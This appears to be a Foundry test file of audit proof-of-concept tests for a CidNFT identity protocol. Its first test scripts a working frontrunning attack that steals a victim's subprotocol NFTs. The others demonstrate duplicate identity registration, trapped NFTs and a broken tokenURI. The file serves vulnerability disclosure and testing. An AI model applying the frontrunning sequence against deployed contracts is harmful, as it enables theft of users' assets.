// SPDX-License-Identifier: GPL-3.0-only
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "./utils/Utilities.sol";
import {console} from "./utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";
import "../AddressRegistry.sol";
import "../SubprotocolRegistry.sol";
import "../CidNFT.sol";
import "./mock/MockERC20.sol";
import "./mock/SubprotocolNFT.sol";


contract AddressRegistryTest is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);
    Utilities internal utils;
    address payable[] internal users;

    // contracts
    SubprotocolRegistry internal subprotocolRegistry;
    AddressRegistry internal addressRegistry;
    CidNFT internal cidNft;
    SubprotocolNFT internal sub1;
    MockToken internal note;

    // invoked before each test case in run
    function setUp() public {
        utils = new Utilities();
        users = utils.createUsers(5);
        
        // NOTE ERC20
        note = new MockToken();

        // SUBPROTOCOL REGISTRY
        subprotocolRegistry = new SubprotocolRegistry(
            address(note), // ERC20NOTE contract
            users[0] // address of the wallet that receives the fees
        );

        // CID NFT
        cidNft = new CidNFT(
            "MockCidNFT", // name
            "MCNFT", // symbol
            "tbd://base_uri/", // baseURI
            users[0], // cidFeeWallet
            address(note), // ERC20NOTE contract
            address(subprotocolRegistry) // subprotocolRegistry contract
        );
        // ADDRESS REGISTRY
        addressRegistry = new AddressRegistry(address(cidNft));

        // SUBPROTOCOL NFT
        sub1 = new SubprotocolNFT();
    }

    // 01-HIGH: attacker can frontrun a victim's mint+add transaction to steal NFT
    function test_StealNFTMintAdd() public {
        address payable attacker = users[0];
        address payable victim = users[1];

        // 2. Attacker frontruns this tx with a mint with no add() params
        vm.startPrank(attacker);
        cidNft.mint(new bytes[](0));

        // 3. Attacker approves NFT #100 to the vistim's
        uint256 nftId = cidNft.numMinted();
        cidNft.approve(victim, nftId);

        vm.stopPrank();

        // 1. Victim sends a tx expecting to mint NFT #100 and include call data to add() their subprotocol to the token
        vm.startPrank(victim);
        (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);
        sub1.mint(victim, subTokenId1);
        sub1.mint(victim, subTokenId2);
        sub1.setApprovalForAll(address(cidNft), true);

        note.mint(victim, 50000 * 1e18);
        note.approve(address(subprotocolRegistry), type(uint256).max);
        
        subprotocolRegistry.register(true, false, false, address(sub1), "sub1", 0);

        bytes[] memory addList = new bytes[](2);
        addList[0] = abi.encode(
            nftId,
            "sub1",
            1,
            subTokenId1,
            CidNFT.AssociationType.ORDERED
        );
        addList[1] = abi.encode(
            nftId,
            "sub1",
            2,
            subTokenId2,
            CidNFT.AssociationType.ORDERED
        );

        cidNft.mint(addList);
        vm.stopPrank();

        // 4. Victim's tx starts execution, receives token #101, thought their add() specifies token #100

        // 5. Attacker can revoke the approval or call remove, to transfer the victim's subprotocolNFT to themselves
        vm.startPrank(attacker);
        cidNft.setApprovalForAll(victim, false);
        cidNft.remove(
            nftId,
            "sub1",
            1,
            subTokenId1,
            CidNFT.AssociationType.ORDERED
        );

        cidNft.remove(
            nftId,
            "sub1",
            2,
            subTokenId2,
            CidNFT.AssociationType.ORDERED
        );

        vm.stopPrank();

        // Confirm that attacker now holds the subtokens
        assertEq(cidNft.ownerOf(nftId), attacker);
        assertEq(cidNft.ownerOf(nftId + 1), victim);
        assertEq(sub1.ownerOf(subTokenId1), attacker);
        assertEq(sub1.ownerOf(subTokenId2), attacker);
    }

    // 01-MED: multiple accounts can have the same identity
    function test_TwoUsersSameCID() public {
        uint256 nftIdOne = 1;

        // 1. Mint a CID NFT
        vm.prank(users[1]);
        cidNft.mint(new bytes[](0));
        assertEq(cidNft.ownerOf(nftIdOne), users[1]);

        // 2. Register CID NFT to the user 1 address
        vm.prank(users[1]);
        addressRegistry.register(nftIdOne);

        // 3. Transfer CID NFT to user 2
        vm.prank(users[1]);
        cidNft.transferFrom(users[1],users[2], nftIdOne);

        // 4. Register CID NFT to the user 2 address
        vm.prank(users[2]);
        addressRegistry.register(nftIdOne);

        assertEq(addressRegistry.getCID(users[1]), 1);
        assertEq(addressRegistry.getCID(users[2]), 1);
    }

    // 02-MED: adding NFTs with AssociationType ORDERED or PRIMARY may cause overwriting and trap NFTs
    function test_OverwritingNfts() public {
        // AssociationType ORDERED
        // (key1, subNft1) and (key1, subNft2) added consecutively
        address payable user = users[0];

        // 1. Mint cidNFT
        vm.startPrank(user);
        cidNft.mint(new bytes[](0));

        // 2. Mint 2 sub tokens
        (uint256 subTokenId1, uint256 subTokenId2) = (1, 2);
        sub1.mint(user, subTokenId1);
        sub1.mint(user, subTokenId2);
        sub1.setApprovalForAll(address(cidNft), true);

        note.mint(user, 50000 * 1e18);
        note.approve(address(subprotocolRegistry), type(uint256).max);
        
        // 3. Register subrotocol
        subprotocolRegistry.register(true, false, false, address(sub1), "sub1", 0);

        // 4. Add 2 nfts with same key
        uint256 nftId = cidNft.numMinted() + 1;
        cidNft.mint(new bytes[](0));

        cidNft.add(
            nftId,
            "sub1",
            1,
            subTokenId1,
            CidNFT.AssociationType.ORDERED
        );
        cidNft.add(
            nftId,
            "sub1",
            1,
            subTokenId2,
            CidNFT.AssociationType.ORDERED
        );

        // Check both nft1 and nft2 have been transferred to CidNFT
        assertEq(sub1.ownerOf(subTokenId1), address(cidNft));
        assertEq(sub1.ownerOf(subTokenId1), address(cidNft));

        // 6. Remove the second NFT
        cidNft.remove(nftId, "sub1", 1, subTokenId1, CidNFT.AssociationType.ORDERED);
        // NFT 2 has been transferred back to the user
        assertEq(sub1.ownerOf(subTokenId2), user);

        // 7. Remove the first NFT - it will fail with PrimaryValueNotSet
        vm.expectRevert(abi.encodeWithSelector(CidNFT.OrderedValueNotSet.selector, nftId, "sub1", 1));
        cidNft.remove(nftId, "sub1", 1, subTokenId1, CidNFT.AssociationType.ORDERED);
        // nft1 is trapped in CidNFT forever
        assertEq(sub1.ownerOf(subTokenId1), address(cidNft));

        vm.stopPrank();
    }

    // 03-MED: cidNFT broken tokenURI function
    function test_BrokenTokenURI() public {
        // token URI does not convert the uint256 _id argument to a string before interpolating it in the token URI

        // mint NFTs
        uint256 id1 = cidNft.numMinted() + 1;
        uint256 id2 = cidNft.numMinted() + 2;
        
        cidNft.mint(new bytes[](0));
        cidNft.mint(new bytes[](0));

        // These pass — the raw bytes '0000000000000000000000000000000000000000000000000000000000000001' are interpolated as _id.

        assertEq(string(bytes(hex"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000012e6a736f6e")), cidNft.tokenURI(id1));
        assertEq(string(bytes(hex"7462643a2f2f626173655f7572692f00000000000000000000000000000000000000000000000000000000000000022e6a736f6e")), cidNft.tokenURI(id2));
        
        // These fail - the generated string on the right is not the expected string on the left. 
        assertEq("tbd://base_uri/1.json", cidNft.tokenURI(id1));
        assertEq("tbd://base_uri/2.json", cidNft.tokenURI(id2));
        vm.stopPrank();
    }
}